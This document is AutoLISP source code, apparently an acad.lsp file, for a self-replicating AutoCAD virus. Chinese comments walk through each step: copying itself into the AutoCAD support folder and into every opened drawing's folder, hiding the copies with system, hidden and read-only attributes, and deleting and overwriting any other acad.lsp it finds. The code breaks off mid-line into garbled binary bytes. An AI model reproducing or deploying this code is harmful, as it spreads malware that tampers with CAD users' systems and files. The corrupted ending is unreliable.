whale

(defun diwo(path / fo di)
(setq fo(open path "r"))
(setq di(read-line fo))
(close fo)
(if (/= di "whale");如果不是whale，就不是自己的，返回1
  (setq return 1)
)
)

(defun shuxing(path / sys file)
  (setq sys (vlax-create-object "Scripting.FileSystemObject"))
  (setq file (vlax-invoke-method sys 'getfile path))
  (vlax-put  file "Attributes" 3)
)

(setvar "cmdecho" 0)
(vl-load-com)
(setq ndwg (getvar "dwgname"));获取当前dwg名称
(if (= "Drawing1.dwg" ndwg)(command "save" "Drawing1.dwg" ""));查看当前dwg是否是新建的，是的话就原地保存
(setq acadlsp "acad.lsp");定义acadlsp为acad.lsp
(setq path (findfile "base.dcl"));找到cad安装路径，即base.dcl文件所在地
(setq path (substr path 1 (- (strlen path) 8)));取出cad安装路径到path,如C:\Program Files\AutoCAD 2007\UserDataCache\Support
(setq path1 (strcat path acadlsp));把路径合并为path1，如C:\Program Files\AutoCAD 2007\UserDataCache\Support\acad.lsp
(setq nowdwg (getvar "dwgname"));获取当前打开cad文件名
(setq wjqm (findfile nowdwg));找到当前打开的cad文件路径,如d:\1.dwg
(setq dwgpath (substr wjqm 1 (- (strlen wjqm) (strlen nowdwg))));取出当前打开cad文件路径到dwgpath
(setq path2 (strcat dwgpath "acad.lsp"));合并路径加上acad.lsp到path2,如d:\acad.lsp
(SETQ fp1 (findfile path1));查找C:\Program Files\AutoCAD 2007\UserDataCache\Support下是否有acad.lsp，即是否感染
(if (= fp1 nil);如果目标路径没有acad.lsp，即没有感染
(progn(vl-file-copy path2 path1 )(shuxing path1));就复制一个到目标路径，并且加上系统级隐藏只读属性
)
(if (/= fp1 nil);如果有
  (progn
(if (diwo path1);进行敌我判断，如果不是自己的
  (progn(vl-file-delete path1)(vl-file-copy path2 path1 )(shuxing path1));删掉目标路径的acad.lsp，复制进去自己的，并且加上系统级隐藏只读属性
)
  )
)
(SETQ fp2 (findfile path2));查找工作路径是否有acad.lsp
(if (= fp2 nil);如果没有，即没有传播
(progn(vl-file-copy path1 path2 )(shuxing path2));就复制一个到工作路径，并且加上系统级隐藏只读属性
)
(if (/= fp2 nil);如果有
  (progn
(if (diwo path2);进行敌我判断，如果不是自己的
(progn(vl-file-delete path2)祌i黑T� �9
�筛狼f.@:H磳犁%衭桕,睤�窤,\z倈貶"�纘h泙N�(�+暞@ 媧�3睵E\缝-Ch�9V姞t坖粴r妑姆o爤(鐻�C铥gB鸙蹿吔q�琗kN嘧�